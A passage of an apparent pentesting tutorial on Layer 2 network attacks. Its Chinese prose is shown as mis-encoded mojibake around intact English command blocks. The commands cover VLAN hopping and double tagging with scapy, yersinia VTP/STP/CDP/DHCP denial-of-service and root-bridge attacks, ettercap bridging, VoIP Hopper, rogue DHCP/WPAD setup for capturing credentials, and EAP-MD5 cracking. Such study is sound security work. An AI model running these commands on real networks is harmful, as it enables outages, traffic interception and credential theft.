RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### è‡ªåŠ¨VLANè·³è·ƒ

è®¨è®ºçš„**åŠ¨æ€ä¸­ç»§å’Œåˆ›å»ºè™šæ‹Ÿæ¥å£ä»¥åŠåœ¨**å…¶ä»–VLANå†…å‘ç°ä¸»æœºçš„æ”»å‡»è¢«ä»¥ä¸‹å·¥å…·**è‡ªåŠ¨æ‰§è¡Œ**ï¼š[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### åŒé‡æ ‡è®°

å¦‚æœæ”»å‡»è€…çŸ¥é“**å—å®³ä¸»æœºçš„MACã€IPå’ŒVLAN IDçš„å€¼**ï¼Œä»–å¯ä»¥å°è¯•å¯¹å¸§è¿›è¡Œ**åŒé‡æ ‡è®°**ï¼Œæ—¢æ ‡è®°å…¶æŒ‡å®šçš„VLANä¹Ÿæ ‡è®°å—å®³è€…çš„VLANï¼Œç„¶åå‘é€æ•°æ®åŒ…ã€‚ç”±äº**å—å®³è€…æ— æ³•å›è¿**æ”»å‡»è€…ï¼Œå› æ­¤æ”»å‡»è€…**æœ€å¥½é€šè¿‡UDPä¸**å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£æ“ä½œçš„åè®®é€šä¿¡ï¼ˆå¦‚SNMPï¼‰ã€‚

æ”»å‡»è€…çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯å‘èµ·**TCPç«¯å£æ‰«æï¼Œä¼ªè£…ä¸€ä¸ªç”±æ”»å‡»è€…æ§åˆ¶ä¸”å—å®³è€…å¯ä»¥è®¿é—®çš„IP**ï¼ˆå¯èƒ½é€šè¿‡äº’è”ç½‘ï¼‰ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»–æ‰€æ‹¥æœ‰çš„ç¬¬äºŒå°ä¸»æœºä¸Šå—…æ¢ï¼Œçœ‹æ˜¯å¦æ”¶åˆ°äº†æ¥è‡ªå—å®³è€…çš„ä¸€äº›æ•°æ®åŒ…ã€‚

![](<../../.gitbook/assets/image (635) (1).png>)

è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨scapyï¼š`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### æ¨ªå‘VLANåˆ†æ®µç»•è¿‡ <a href="#d679" id="d679"></a>

å¦‚æœä½ **å¯ä»¥è®¿é—®ä½ ç›´æ¥è¿æ¥çš„äº¤æ¢æœº**ï¼Œä½ å°±æœ‰èƒ½åŠ›åœ¨ç½‘ç»œå†…**ç»•è¿‡VLANåˆ†æ®µ**ã€‚åªéœ€**å°†ç«¯å£åˆ‡æ¢åˆ°trunkæ¨¡å¼**ï¼ˆä¹Ÿç§°ä¸ºtrunkï¼‰ï¼Œåˆ›å»ºå¸¦æœ‰ç›®æ ‡VLANs IDçš„è™šæ‹Ÿæ¥å£ï¼Œå¹¶é…ç½®IPåœ°å€ã€‚ä½ å¯ä»¥å°è¯•åŠ¨æ€è¯·æ±‚åœ°å€ï¼ˆDHCPï¼‰ï¼Œæˆ–è€…ä½ å¯ä»¥é™æ€é…ç½®å®ƒã€‚è¿™å–å†³äºå…·ä½“æƒ…å†µã€‚

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### ä¸‰å±‚ç§æœ‰VLANç»•è¿‡

åœ¨å®¢æˆ·æ— çº¿ç½‘ç»œå’Œå…¶ä»–ç¯å¢ƒä¸­ï¼Œç§æœ‰VLANï¼ˆä¹Ÿç§°ä¸º_ç«¯å£éš”ç¦»_ï¼‰è®¾ç½®ç”¨äº**é˜²æ­¢å¯¹ç­‰äº’åŠ¨**ï¼ˆå³ï¼Œå®¢æˆ·ç«¯**è¿æ¥åˆ°æ— çº¿æ¥å…¥ç‚¹ä½†ä¸èƒ½ç›¸äº’é€šä¿¡**ï¼‰ã€‚æ ¹æ®ç½‘ç»œACLsï¼ˆæˆ–ç¼ºä¹ACLsï¼‰ï¼Œå¯èƒ½å¯ä»¥å‘è·¯ç”±å™¨å‘é€IPæ•°æ®åŒ…ï¼Œç„¶åè·¯ç”±å™¨å°†æ•°æ®åŒ…è½¬å‘å›é‚»è¿‘çš„å¯¹ç­‰ç«¯ã€‚

è¿™ç§æ”»å‡»å°†å‘é€ä¸€ä¸ª**ç‰¹åˆ¶çš„æ•°æ®åŒ…åˆ°å®¢æˆ·ç«¯çš„IPï¼Œä½†ä½¿ç”¨è·¯ç”±å™¨çš„MAC**ã€‚ç„¶åï¼Œ**è·¯ç”±å™¨å°†é‡å®šå‘æ•°æ®åŒ…åˆ°å®¢æˆ·ç«¯**ã€‚å¦‚åŒ_åŒé‡æ ‡è®°æ”»å‡»_ï¼Œä½ å¯ä»¥é€šè¿‡æ§åˆ¶å—å®³è€…å¯ä»¥è®¿é—®çš„ä¸»æœºæ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚

### VTPæ”»å‡»

**VTPï¼ˆVLAN Trunking Protocolï¼‰**æ˜¯ä¸€ä¸ªæ—¨åœ¨é›†ä¸­ç®¡ç†VLANsçš„åè®®ã€‚ä¸ºäº†è·Ÿè¸ªå½“å‰çš„VLANæ•°æ®åº“ï¼Œäº¤æ¢æœºæ£€æŸ¥ç‰¹æ®Šçš„ä¿®è®¢å·ã€‚å½“ä»»ä½•è¡¨æ›´æ–°å‘ç”Ÿæ—¶ï¼Œä¿®è®¢å·å¢åŠ ä¸€ã€‚å¦‚æœäº¤æ¢æœºæ£€æµ‹åˆ°å…·æœ‰æ›´é«˜ä¿®è®¢å·çš„é…ç½®ï¼Œå®ƒå°†è‡ªåŠ¨æ›´æ–°å…¶VLANæ•°æ®åº“ã€‚

#### VTPåŸŸä¸­çš„è§’è‰² <a href="#ebfc" id="ebfc"></a>

* **VTPæœåŠ¡å™¨ã€‚**åœ¨VTPæœåŠ¡å™¨è§’è‰²ä¸­çš„äº¤æ¢æœºå¯ä»¥åˆ›å»ºæ–°çš„VLANsï¼Œåˆ é™¤æ—§çš„ï¼Œæˆ–è€…æ”¹å˜VLANsæœ¬èº«çš„ä¿¡æ¯ã€‚**å®ƒè¿˜ä¸ºåŸŸä¸­çš„å…¶ä»–æˆå‘˜ç”ŸæˆVTPå…¬å‘Šã€‚**
* **VTPå®¢æˆ·ç«¯ã€‚**åœ¨æ­¤è§’è‰²ä¸­çš„äº¤æ¢æœºå°†ä»åŸŸä¸­çš„å…¶ä»–äº¤æ¢æœºæ¥æ”¶ç‰¹å®šçš„VTPå…¬å‘Šï¼Œä»¥æ›´æ–°å…¶è‡ªå·±çš„VLANæ•°æ®åº“ã€‚å®¢æˆ·ç«¯åœ¨åˆ›å»ºVLANsæ–¹é¢å—åˆ°é™åˆ¶ï¼Œç”šè‡³ä¸å…è®¸æœ¬åœ°æ›´æ”¹VLANé…ç½®ã€‚æ¢å¥è¯è¯´ï¼Œ**åªè¯»è®¿é—®ã€‚**
* **VTPé€æ˜ã€‚**åœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œäº¤æ¢æœºä¸å‚ä¸VTPè¿‡ç¨‹ï¼Œå¹¶ä¸”å¯ä»¥å®Œå…¨æœ¬åœ°ç®¡ç†æ•´ä¸ªVLANé…ç½®ã€‚åœ¨é€æ˜æ¨¡å¼ä¸‹è¿è¡Œæ—¶ï¼Œäº¤æ¢æœºåªä¼ è¾“å…¶ä»–äº¤æ¢æœºçš„VTPå…¬å‘Šï¼Œè€Œä¸å½±å“å®ƒä»¬çš„VLANé…ç½®ã€‚**è¿™æ ·çš„äº¤æ¢æœºå°†å§‹ç»ˆå…·æœ‰ä¿®è®¢å·ä¸ºé›¶ï¼Œä¸”æ— æ³•è¢«æ”»å‡»ã€‚**

#### å¹¿å‘Šç±»å‹ <a href="#b384" id="b384"></a>

* **æ‘˜è¦å¹¿å‘Š â€”** VTPæœåŠ¡å™¨æ¯**300ç§’ï¼ˆ5åˆ†é’Ÿï¼‰**å‘é€çš„VTPå…¬å‘Šã€‚æ­¤å…¬å‘Šå­˜å‚¨VTPåŸŸåã€åè®®ç‰ˆæœ¬ã€æ—¶é—´æˆ³å’ŒMD5é…ç½®å“ˆå¸Œå€¼ã€‚
* **å­é›†å¹¿å‘Š â€”** æ¯å½“VLANé…ç½®æ›´æ”¹å‘ç”Ÿæ—¶å‘é€çš„VTPå…¬å‘Šã€‚
* **å¹¿å‘Šè¯·æ±‚ â€”** æ˜¯VTPå®¢æˆ·ç«¯å‘VTPæœåŠ¡å™¨è¯·æ±‚æ‘˜è¦å¹¿å‘Šæ¶ˆæ¯çš„è¯·æ±‚ã€‚é€šå¸¸åœ¨äº¤æ¢æœºæ£€æµ‹åˆ°å…·æœ‰æ›´é«˜é…ç½®ä¿®è®¢å·çš„æ‘˜è¦å¹¿å‘Šæ¶ˆæ¯æ—¶å‘é€ã€‚

VTP**åªèƒ½ä»trunkç«¯å£æ”»å‡»**ï¼Œå› ä¸º**VTPå…¬å‘Šåªåœ¨trunkç«¯å£ä¸Šå¹¿æ’­å’Œæ¥æ”¶ã€‚** **å› æ­¤ï¼Œåœ¨æ”»å‡»DTPåè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œä½ çš„ä¸‹ä¸€ä¸ªç›®æ ‡å¯èƒ½æ˜¯VTPã€‚**è¦æ”»å‡»VTPåŸŸï¼Œä½ å¯ä»¥**ä½¿ç”¨Yersinia**æ¥**è¿è¡ŒVTPæ³¨å…¥ï¼Œå°†æ“¦é™¤æ•´ä¸ªVLAN** **æ•°æ®åº“**ï¼Œä»è€Œä½¿ç½‘ç»œç˜«ç—ªã€‚

{% hint style="info" %}
VTPåè®®æœ‰å¤šè¾¾**ä¸‰ä¸ªç‰ˆæœ¬**ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæ”»å‡»çš„æ˜¯ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼ŒVTPv1
{% endhint %}
```bash
yersinia -G #For graphic mode
```
è¦åˆ é™¤æ•´ä¸ªVLANæ•°æ®åº“ï¼Œè¯·é€‰æ‹©**åˆ é™¤æ‰€æœ‰VTP VLAN**é€‰é¡¹

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STPæ”»å‡»

**å¦‚æœä½ æ— æ³•åœ¨æ¥å£ä¸Šæ•è·BPDUå¸§ï¼Œé‚£ä¹ˆä½ æˆåŠŸè¿›è¡ŒSTPæ”»å‡»çš„å¯èƒ½æ€§ä¸å¤§ã€‚**

#### **STP BPDU DoS**

å‘é€å¤§é‡çš„BPDUs TCPï¼ˆæ‹“æ‰‘æ›´æ”¹é€šçŸ¥ï¼‰æˆ–Confï¼ˆåˆ›å»ºæ‹“æ‰‘æ—¶å‘é€çš„BPDUsï¼‰ï¼Œäº¤æ¢æœºä¼šè¿‡è½½å¹¶åœæ­¢æ­£ç¡®å·¥ä½œã€‚
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP æ”»å‡»**

å½“ä¸€ä¸ª TCP è¢«å‘é€æ—¶ï¼Œäº¤æ¢æœºçš„ CAM è¡¨å°†åœ¨15ç§’å†…è¢«åˆ é™¤ã€‚ç„¶åï¼Œå¦‚æœä½ æŒç»­å‘é€è¿™ç§ç±»å‹çš„æ•°æ®åŒ…ï¼ŒCAM è¡¨å°†ä¸æ–­é‡å¯ï¼ˆæˆ–æ¯15ç§’ä¸€æ¬¡ï¼‰ï¼Œå½“å®ƒé‡å¯æ—¶ï¼Œäº¤æ¢æœºçš„è¡Œä¸ºå°±åƒä¸€ä¸ªé›†çº¿å™¨ã€‚
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

æ”»å‡»è€…æ¨¡æ‹Ÿäº¤æ¢æœºçš„è¡Œä¸ºï¼Œæˆä¸ºç½‘ç»œçš„STPæ ¹èŠ‚ç‚¹ã€‚ç„¶åï¼Œæ›´å¤šæ•°æ®å°†é€šè¿‡ä»–ä¼ è¾“ã€‚å½“ä½ è¿æ¥åˆ°ä¸¤ä¸ªä¸åŒçš„äº¤æ¢æœºæ—¶ï¼Œè¿™ä¸€ç‚¹å¾ˆæœ‰è¶£ã€‚\
è¿™æ˜¯é€šè¿‡å‘é€BPDUs CONFæ•°æ®åŒ…ï¼Œå£°ç§°**ä¼˜å…ˆçº§**å€¼å°äºå®é™…æ ¹äº¤æ¢æœºçš„å®é™…ä¼˜å…ˆçº§æ¥å®Œæˆçš„ã€‚
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**å¦‚æœæ”»å‡»è€…è¿æ¥åˆ°2ä¸ªäº¤æ¢æœºï¼Œä»–å¯ä»¥æˆä¸ºæ–°æ ‘çš„æ ¹ï¼Œè¿™ä¸¤ä¸ªäº¤æ¢æœºä¹‹é—´çš„æ‰€æœ‰æµé‡éƒ½å°†é€šè¿‡ä»–**ï¼ˆå°†æ‰§è¡ŒMITMæ”»å‡»ï¼‰ã€‚
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP æ”»å‡»

CISCO Discovery Protocol æ˜¯ CISCO è®¾å¤‡ç”¨æ¥ç›¸äº’é€šä¿¡çš„åè®®ï¼Œ**å‘ç°è°åœ¨çº¿**ä»¥åŠå®ƒä»¬å…·æœ‰ä»€ä¹ˆåŠŸèƒ½ã€‚

#### ä¿¡æ¯æ”¶é›† <a href="#0e0f" id="0e0f"></a>

**é»˜è®¤æƒ…å†µä¸‹ï¼ŒCDP ä¼šå‘æ‰€æœ‰ç«¯å£å‘é€å…¬å‘Šã€‚**ä½†å¦‚æœå…¥ä¾µè€…è¿æ¥åˆ°åŒä¸€äº¤æ¢æœºä¸Šçš„ç«¯å£æ€ä¹ˆåŠï¼Ÿä½¿ç”¨ç½‘ç»œå—…æ¢å™¨ï¼Œæ— è®ºæ˜¯ **Wireshark,** **tcpdump** è¿˜æ˜¯ **Yersinia**ï¼Œä»–éƒ½èƒ½æå–**æœ‰å…³è®¾å¤‡æœ¬èº«çš„å®è´µä¿¡æ¯**ï¼Œä»å…¶å‹å·åˆ° Cisco IOS ç‰ˆæœ¬ã€‚ä½¿ç”¨è¿™äº›ä¿¡æ¯ï¼Œä»–å°†èƒ½å¤Ÿæšä¸¾ç›¸åŒç‰ˆæœ¬çš„ Cisco IOS å¹¶æ‰¾åˆ°æ¼æ´ï¼Œç„¶ååˆ©ç”¨å®ƒã€‚

#### CDP æ³›æ´ªæ”»å‡» <a href="#0d6a" id="0d6a"></a>

ä½ å¯ä»¥é€šè¿‡æ¨¡æ‹ŸçœŸå®çš„ CISCO è®¾å¤‡æ¥è€—å°½è®¾å¤‡å†…å­˜ï¼Œå¯¹ CISCO äº¤æ¢æœºè¿›è¡Œ DoS æ”»å‡»ã€‚
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
é€‰æ‹©**æ³›æ´ªCDPè¡¨**é€‰é¡¹å¹¶å¼€å§‹æ”»å‡»ã€‚äº¤æ¢æœºCPUå°†ä¼šè¿‡è½½ï¼ŒCDPé‚»å±…è¡¨ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œ**å¯¼è‡´â€œç½‘ç»œç˜«ç—ªâ€ã€‚**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDPå†’å……æ”»å‡»
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ [**scapy**](https://github.com/secdev/scapy/)ã€‚ç¡®ä¿å®‰è£…æ—¶åŒ…å« `scapy/contrib` åŒ…ã€‚

### VoIP æ”»å‡»

å°½ç®¡VoIPï¼ˆç½‘ç»œç”µè¯ï¼‰è®¾å¤‡åŸæœ¬æ˜¯ä¸ºå‘˜å·¥ä½¿ç”¨è®¾è®¡çš„ï¼Œä½†ç°ä»£VoIPè®¾å¤‡è¶Šæ¥è¶Šå¤šåœ°ä¸ç‰©è”ç½‘è®¾å¤‡é›†æˆã€‚ç°åœ¨è®¸å¤šå‘˜å·¥å¯ä»¥ä½¿ç”¨ç‰¹å®šç”µè¯å·ç è§£é”é—¨ï¼Œæ§åˆ¶æˆ¿é—´çš„æ¸©æ§å™¨...

å·¥å…· [**voiphopper**](http://voiphopper.sourceforge.net) æ¨¡ä»¿Ciscoã€Avayaã€Nortelå’ŒAlcatel-Lucentç¯å¢ƒä¸­VoIPç”µè¯çš„è¡Œä¸ºã€‚å®ƒä½¿ç”¨æ”¯æŒçš„è®¾å¤‡å‘ç°åè®®ä¹‹ä¸€ï¼Œå¦‚Ciscoå‘ç°åè®®ï¼ˆCDPï¼‰ã€åŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼ˆDHCPï¼‰ã€é“¾è·¯å±‚å‘ç°åè®®åª’ä½“ç«¯ç‚¹å‘ç°ï¼ˆLLDP-MEDï¼‰å’Œ802.1Q ARPï¼Œè‡ªåŠ¨å‘ç°è¯­éŸ³ç½‘ç»œçš„æ­£ç¡®VLAN IDã€‚

**VoIP Hopper** æ”¯æŒ **ä¸‰ç§** CDPæ¨¡å¼ã€‚**å—…æ¢**æ¨¡å¼æ£€æŸ¥ç½‘ç»œæ•°æ®åŒ…å¹¶å°è¯•å®šä½VLAN IDã€‚ä½¿ç”¨æ—¶ï¼Œå°† **`-c`** å‚æ•°è®¾ç½®ä¸º `0`ã€‚**æ¬ºéª—**æ¨¡å¼ç”Ÿæˆç±»ä¼¼äºçœŸå®VoIPè®¾å¤‡åœ¨ä¼ä¸šç½‘ç»œä¸­ä¼ è¾“çš„è‡ªå®šä¹‰æ•°æ®åŒ…ã€‚ä½¿ç”¨æ—¶ï¼Œå°† **`-c`** å‚æ•°è®¾ç½®ä¸º **`1`**ã€‚å¸¦æœ‰ **é¢„åˆ¶æ•°æ®åŒ…** çš„æ¬ºéª—æ¨¡å¼å‘é€ä¸Cisco 7971G-GE IPç”µè¯ç›¸åŒçš„æ•°æ®åŒ…ã€‚ä½¿ç”¨æ—¶ï¼Œå°† **`-c`** å‚æ•°è®¾ç½®ä¸º **`2`**ã€‚

æˆ‘ä»¬ä½¿ç”¨æœ€åä¸€ç§æ–¹æ³•ï¼Œå› ä¸ºå®ƒæ˜¯æœ€å¿«çš„æ–¹æ³•ã€‚**`-i`** å‚æ•°æŒ‡å®šæ”»å‡»è€…çš„ **ç½‘ç»œ** **æ¥å£**ï¼Œ**`-E`** å‚æ•°æŒ‡å®šè¢«æ¨¡ä»¿çš„ **VOIPè®¾å¤‡åç§°**ã€‚æˆ‘ä»¬é€‰æ‹©äº†ä¸Cisco VoIPç”µè¯å‘½åæ ¼å¼å…¼å®¹çš„åç§°SEP001EEEEEEEEEã€‚è¯¥æ ¼å¼ç”±â€œSEPâ€å¼€å¤´ï¼Œåè·Ÿä¸€ä¸ªMACåœ°å€ã€‚åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹ç”µè¯èƒŒé¢çš„MACæ ‡ç­¾ï¼›æŒ‰ä¸‹ç”µè¯çš„è®¾ç½®æŒ‰é’®å¹¶é€‰æ‹©ç”µè¯æ˜¾ç¤ºå±ä¸Šçš„å‹å·ä¿¡æ¯é€‰é¡¹ï¼›æˆ–è€…å°†VoIPè®¾å¤‡çš„ä»¥å¤ªç½‘çº¿è¿æ¥åˆ°æ‚¨çš„ç¬”è®°æœ¬ç”µè„‘ï¼Œå¹¶ä½¿ç”¨Wiresharkè§‚å¯Ÿè®¾å¤‡çš„CDPè¯·æ±‚ï¼Œæ¥æ¨¡ä»¿ç°æœ‰çš„VoIPè®¾å¤‡ã€‚
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
å¦‚æœå·¥å…·æ‰§è¡ŒæˆåŠŸï¼Œ**VLAN ç½‘ç»œå°†ä¸ºæ”»å‡»è€…çš„è®¾å¤‡åˆ†é…ä¸€ä¸ª IPv4 åœ°å€**ã€‚

### DHCP æ”»å‡»

#### æšä¸¾
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**ä¸¤ç§ç±»å‹çš„DoS**å¯ä»¥å¯¹DHCPæœåŠ¡å™¨æ‰§è¡Œã€‚ç¬¬ä¸€ç§æ˜¯**æ¨¡æ‹Ÿè¶³å¤Ÿå¤šçš„å‡ä¸»æœºä»¥ä½¿ç”¨æ‰€æœ‰å¯èƒ½çš„IPåœ°å€**ã€‚\
è¿™ç§æ”»å‡»åªæœ‰åœ¨ä½ èƒ½çœ‹åˆ°DHCPæœåŠ¡å™¨çš„å“åº”å¹¶å®Œæˆåè®®ï¼ˆ**å‘ç°**ï¼ˆå®¢æˆ·ç«¯ï¼‰--> **æä¾›**ï¼ˆæœåŠ¡å™¨ï¼‰--> **è¯·æ±‚**ï¼ˆå®¢æˆ·ç«¯ï¼‰--> **ç¡®è®¤**ï¼ˆæœåŠ¡å™¨ï¼‰ï¼‰æ—¶æ‰ä¼šèµ·ä½œç”¨ã€‚ä¾‹å¦‚ï¼Œåœ¨**Wifiç½‘ç»œä¸­ä¸å¯èƒ½**ã€‚

å¦ä¸€ç§æ‰§è¡ŒDHCP DoSçš„æ–¹æ³•æ˜¯ä½¿ç”¨æ¯ä¸ªå¯èƒ½çš„IPä½œä¸ºæºä»£ç å‘é€**DHCP-RELEASEæ•°æ®åŒ…**ã€‚ç„¶åï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºæ¯ä¸ªäººéƒ½å·²ç»å®Œæˆäº†IPçš„ä½¿ç”¨ã€‚
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
ä»¥ä¸‹æ˜¯ä½¿ç”¨å·¥å…· [DHCPing](https://github.com/kamorin/DHCPig) çš„æ›´è‡ªåŠ¨åŒ–çš„æ–¹æ³•ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šè¿° DoS æ”»å‡»å¼ºè¿«å®¢æˆ·ç«¯åœ¨ç¯å¢ƒä¸­è·å–æ–°ç§Ÿçº¦ï¼Œå¹¶è€—å°½åˆæ³•æœåŠ¡å™¨ï¼Œä½¿å…¶æ— å“åº”ã€‚å› æ­¤ï¼Œå½“åˆæ³•å°è¯•é‡æ–°è¿æ¥æ—¶ï¼Œ**æ‚¨å¯ä»¥æä¾›ä¸‹ä¸€æ¬¡æ”»å‡»ä¸­æåˆ°çš„æ¶æ„å€¼**ã€‚

#### è®¾ç½®æ¶æ„å€¼

æ‚¨å¯ä»¥ä½¿ç”¨ Responder DHCP è„šæœ¬ (_/usr/share/responder/DHCP.py_) æ¥å»ºç«‹ä¸€ä¸ªæ¶æ„çš„ DHCP æœåŠ¡å™¨ã€‚è®¾ç½®æ¶æ„ç½‘å…³å¹¶ä¸ç†æƒ³ï¼Œå› ä¸ºåŠ«æŒçš„è¿æ¥åªæ˜¯åŠåŒå·¥çš„ï¼ˆå³ï¼Œæˆ‘ä»¬æ•è·æ¥è‡ªå®¢æˆ·ç«¯çš„å‡ºç«™æ•°æ®åŒ…ï¼Œä½†ä¸æ•è·æ¥è‡ªåˆæ³•ç½‘å…³çš„å“åº”ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘å»ºè®®è®¾ç½®ä¸€ä¸ªæ¶æ„çš„ DNS æˆ– WPAD æœåŠ¡å™¨ï¼Œä»¥æ•è· HTTP æµé‡å’Œç‰¹åˆ«æ˜¯å‡­æ®ã€‚

| æè¿°                                       | ç¤ºä¾‹                                                                        |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| æˆ‘ä»¬çš„ IP åœ°å€ï¼Œä½œä¸ºç½‘å…³å®£ä¼                | _-i 10.0.0.100_                                                            |
| æœ¬åœ° DNS åŸŸåï¼ˆå¯é€‰ï¼‰                      | _-d example.org_                                                           |
| åŸå§‹è·¯ç”±å™¨/ç½‘å…³çš„ IP åœ°å€                  | _-r 10.0.0.1_                                                              |
| ä¸» DNS æœåŠ¡å™¨ IP åœ°å€                       | _-p 10.0.0.100_                                                            |
| æ¬¡ DNS æœåŠ¡å™¨ IP åœ°å€ï¼ˆå¯é€‰ï¼‰              | _-s 10.0.0.1_                                                              |
| æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç                           | _-n 255.255.255.0_                                                         |
| ç”¨äºç›‘å¬ DHCP æµé‡çš„æ¥å£                    | _-I eth1_                                                                  |
| WPAD é…ç½®åœ°å€ï¼ˆURLï¼‰                        | _-w â€œ_[http://10.0.0.100/wpad.dat\nâ€](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| ä¼ªé€ é»˜è®¤ç½‘å…³ IP åœ°å€                        | -S                                                                         |
| å“åº”æ‰€æœ‰ DHCP è¯·æ±‚ï¼ˆéå¸¸åµé—¹ï¼‰              | -R                                                                         |

### **EAP æ”»å‡»**

ä»¥ä¸‹æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥é’ˆå¯¹ 802.1X å®ç°çš„æ”»å‡»ç­–ç•¥ï¼š

* é€šè¿‡ EAP è¿›è¡Œä¸»åŠ¨çš„æš´åŠ›ç ´è§£å¯†ç 
* ä½¿ç”¨ç•¸å½¢ EAP å†…å®¹æ”»å‡» RADIUS æœåŠ¡å™¨ _\*\*_ï¼ˆåˆ©ç”¨ï¼‰
* EAP æ¶ˆæ¯æ•è·å’Œç¦»çº¿å¯†ç ç ´è§£ï¼ˆEAP-MD5 å’Œ PEAPï¼‰
* å¼ºåˆ¶ EAP-MD5 è®¤è¯ä»¥ç»•è¿‡ TLS è¯ä¹¦éªŒè¯
* åœ¨ä½¿ç”¨é›†çº¿å™¨æˆ–ç±»ä¼¼è®¾å¤‡è®¤è¯åæ³¨å…¥æ¶æ„ç½‘ç»œæµé‡

å¦‚æœæ”»å‡»è€…ä½äºå—å®³è€…å’Œè®¤è¯æœåŠ¡å™¨ä¹‹é—´ï¼Œä»–å¯ä»¥å°è¯•ï¼ˆå¦‚æœ‰å¿…è¦ï¼‰å°†è®¤è¯åè®®é™çº§ä¸º EAP-MD5 å¹¶æ•è·è®¤è¯å°è¯•ã€‚ç„¶åï¼Œä»–å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæš´åŠ›ç ´è§£ï¼š
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) æ”»å‡» <a href="#6196" id="6196"></a>

**FHRP**ï¼ˆFirst Hop Redundancy Protocolï¼Œé¦–è·³å†—ä½™åè®®ï¼‰æ˜¯ä¸€ç±»è®¾è®¡ç”¨äº**åˆ›å»ºçƒ­å¤‡ä»½è·¯ç”±ç³»ç»Ÿ**çš„ç½‘ç»œåè®®ã€‚é€šè¿‡FHRPï¼Œç‰©ç†è·¯ç”±å™¨å¯ä»¥ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„é€»è¾‘è®¾å¤‡ï¼Œè¿™å¢åŠ äº†å®¹é”™èƒ½åŠ›å¹¶æœ‰åŠ©äºåˆ†é…è´Ÿè½½ã€‚

**æ€ç§‘ç³»ç»Ÿå·¥ç¨‹å¸ˆå¼€å‘äº†ä¸¤ç§FHRPåè®®ï¼ŒGLBPå’ŒHSRPã€‚**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

